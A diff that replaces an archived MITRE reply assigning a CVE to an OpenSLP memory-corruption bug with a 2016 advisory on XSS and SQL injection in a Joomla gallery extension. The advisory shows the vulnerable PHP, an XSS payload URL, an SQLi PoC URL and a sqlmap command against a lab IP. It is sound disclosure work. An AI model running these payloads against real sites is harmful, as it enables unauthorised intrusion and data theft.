@@ -1,63 +1,61 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/28/1
-Message-Id: <20160928061236.BC79DABC200@smtpvmsrv1.mitre.org>
-Date: Wed, 28 Sep 2016 02:12:36 -0400 (EDT)
-From: cve-assign@...re.org
-To: renorobert@...il.com
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE Request - OpenSLP 2.0 Memory Corruption
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/07/23/3
+Message-id: <5b1698b9-7904-43ba-9fda-c2d5569f8028@me.com>
+Date: Sat, 23 Jul 2016 14:59:16 +0000 (GMT)
+From: "Larry W. Cashdollar" <larry0@...com>
+To: Open Source Security <oss-security@...ts.openwall.com>
+Subject: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Title: XSS and SQLi in huge IT gallery v1.1.5 for Joomla
+Fixed: v1.1.7
+Author: Larry W. Cashdollar, @_larry0 and Elitza Neytcheva, @ElitzaNeytcheva
+Date: 2016-07-14
+Download Site: http://extensions.joomla.org/extensions/extension/photos-a-images/galleries/gallery-pro
+Vendor: huge-it.com
+Vendor Notified: 2016-07-15, fixed 2016-07-23
+Vendor Contact: info@...e-it.com
+Description: The plugin allows you to add multiple images to the gallery, create countless galleries, add a description to each of them, as well as make the same things with video links.
+Vulnerability:
+The attacker must be logged in with at least manager level access or access to the administrative panel to exploit this vulnerability:
 
-> The following commit fixes a memory corruption bug that I reported in OpenSLP:
-> 
-> https://sourceforge.net/p/openslp/mercurial/ci/34fb3aa5e6b4997fa21cb614e480de36da5dbc9a/
-> 
-> Below are the details of the issue:
-> 
-> static int SLPFoldWhiteSpace(size_t len, char * str)
-> {
->       char * p = str, * ep = str + len;
->       while (p < ep)
->       {
->             if (isspace(*p))
->             {
->                 char * ws2p = ++p;
->                 while (isspace(*p))
->                      p++;
->                 len -= p - ws2p;
->                 memmove(ws2p, p, ep - p);
-> 
-> The outer while loop checks for p < ep, but lack of bound check in
-> inner while loop could result in p > ep. This will result in passing a
-> very large 'size_t len' (ep - p) parameter for memmove().
+SQL in code via id parameter:
+./administrator/components/com_gallery/models/gallery.php
+51 public function getPropertie() {
+52 $db = JFactory::getDBO();
+53 $id_cat = JRequest::getVar('id');
+54 $query = $db->getQuery(true);
+55 $query->select('#__huge_itgallery_images.name as name,'
+56 . '#__huge_itgallery_images.id ,'
+57 . '#__huge_itgallery_gallerys.name as portName,'
+58 . 'gallery_id, #__huge_itgallery_images.description as description,image_url,sl_url,sl_type,link_target,#__huge_itg allery_images.ordering,#__huge_itgallery_images.published,published_in_sl_width');
+59 $query->from(array('#__huge_itgallery_gallerys' => '#__huge_itgallery_gallerys', '#__huge_itgallery_images' => '#__huge_itg allery_images'));
+60 $query->where('#__huge_itgallery_gallerys.id = gallery_id')->where('gallery_id=' . $id_cat);
+61 $query->order('ordering desc');
+62 
+64 $db->setQuery($query);
+65 $results = $db->loadObjectList();
+66 return $results;
+67 }
 
->> Bug 151: Fix memory corruption due to possible overflow in SLPFoldWhiteSpace
->> common/slp_compare.c
 
-Use CVE-2016-7567.
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
+XSS is here:
 
-iQIcBAEBCAAGBQJX617/AAoJEHb/MwWLVhi2UX8QAKBc9RSARlbHWcJyRKjGgota
-RA7gbhguRpArlE9nNw3sg17gSFXeP9YbekIVcGbPHkzZsa8rjg/UuAJzJAUjIsWA
-ttclyg+in1HUdq52wHViKkZNIdIzn5UsEPqd3XZICDjq+bFr1ZXr/PUXUeJ+erbm
-dyf6mcII7RRGUwSG/wmhQmFsKnDKBaLkYdQ1+nywoLDpRpCHsR+FvQcMsv0cUPrh
-Tupd1e+u/Th2U7X/qc3Gx4OqVzBpfLgZxT25XlOZtBgRQiXnFMnkpN40lCr5RiTh
-eFuJFrajC7tVDQsz7x2zrZq45zwi2346XjpCW77H6NXehVCAjC2hkEUPAjW/iN0S
-JDB9ZwiCEjMbfj/FV+7lxwfJY4jF1jMToeMnjkWQvxa4cswKaRzW4f7ozK4bdrXf
-B2aQoU8V9Wv3raDue2vffZ+2gcZ8i6G4yUeCj0A5M6IR5Ns13cnozXggdEz3M0Qw
-8jH5UTWUO5W79gydhdh6tk3PKN2e/zpLH/9iSMPLSw6fjCfVdN6lQMlEhv2SkSeJ
-jA6Ba1JtzoWeccQ9moCKu+sknXsDL254ZTjY/e0MpELhO1T+MrIsY6byj5HcnElL
-hW48Yjxk0BrEKG44DkAXY6MoRaY9ATjG2mE0RI6uHUARYcAQEDYqvt8PUm1hr/pD
-SbxziiqDfsNC77qcjZbm
-=S1u7
------END PGP SIGNATURE-----
+root@...mla:/var/www/html# find . -name "*.php" -exec grep -l "echo \$_GET" {} \;
+./administrator/components/com_gallery/views/gallery/tmpl/default.php
+root@...mla:/var/www/html# find . -name "*.php" -exec grep -n "echo \$_GET" {} \;
+256: <a class="modal" rel="{handler: 'iframe', size: {x: 800, y: 500}}" href="index.php?option=com_gallery&view=video&tmpl=component&pid=<?php echo $_GET['id']; ?>" title="Image" >
+CVE-2016-1000113 2016-1000114
+JSON: Export
+Exploit Code:
+XSS PoC
+http://192.168.0.125/administrator/index.php?option=com_gallery&view=gallery&id=1--%20%22%3E%3Cscript%3Ealert(1);%3C/script%3E
+
+SQLi PoC
+http://192.168.0.125/administrator/index.php?option=com_gallery&view=gallery&id=SQLiHERE
+
+$ sqlmap --load-cookies=cookies.txt -u "http://192.168.0.125/administrator/index.php?option=com_gallery&view=gallery&id=*" --dbms mysql
+Screen Shots:
+Advisory: http://www.vapidlabs.com/advisory.php?v=164
+Content of type "text/html" skipped
